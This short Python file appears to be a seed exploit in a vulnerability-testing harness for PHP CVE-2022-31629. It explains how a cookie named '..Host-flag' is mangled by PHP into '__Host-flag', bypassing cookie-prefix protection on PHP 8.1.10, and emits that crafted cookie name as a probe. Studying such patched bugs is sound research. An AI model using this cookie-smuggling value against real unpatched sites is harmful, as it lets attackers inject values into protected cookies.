#!/usr/bin/env python3
"""[GIVEN] CVE-2022-31629 seed exploit — the ORIGINAL cookie-prefix collision.

PHP's variable-name mangling (main/php_variables.c :: php_register_variable_ex)
replaces '.' and ' ' with '_' in $_COOKIE names. So a raw cookie named
"..Host-flag" — which a browser does NOT treat as a "__Host-" prefixed cookie,
and therefore lets any insecure / cross-site context set — is normalized by PHP
into "__Host-flag", smuggling the attacker value into the protected slot.

Reaches the flag on V0 (php 8.1.10). BLOCKED on V1 (php 8.1.11): CVE-2022-31629
added an early __Host-/__Secure- forbidden-name check that catches the dot-mangled
name right after the mangling loop.

The probe carries the per-run ${PCB_FLAG} as the cookie VALUE; the oracle detects
it in the reflected protected slot.
"""

# Raw cookie NAME sent literally on the wire (never normalized by the client).
# It is NOT literally "__Host-flag", so only PHP's mangling can make it collide.
COOKIE_NAME = "..Host-flag"


def candidate():
    return {"probe_id": "original-dotdot", "cookie_name": COOKIE_NAME}


if __name__ == "__main__":
    import json as _json
    print(_json.dumps(candidate()))
